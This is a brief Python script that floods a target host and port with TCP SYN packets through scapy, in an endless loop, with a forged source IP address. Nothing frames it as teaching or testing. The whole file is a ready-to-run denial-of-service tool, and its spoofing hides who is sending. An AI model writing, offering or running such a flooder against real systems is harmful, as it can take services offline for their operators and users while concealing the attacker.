import socket
from scapy.all import IP, TCP, send
import sys

def main(target,port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            fake_ip = "182.21.20.32"
            ip_packet = IP(src=fake_ip, dst=target)

            syn_packet = TCP(sport=12345, dport=port, flags="S", seq=12345)

            send(ip_packet/syn_packet)

        except KeyboardInterrupt:
            break

        except socket.error:
            print("Socket error occurred. Check privileges or run with admin/root access.")
            break

if __name__ == "__main__":
    main(sys.argv[1],sys.argv[2])
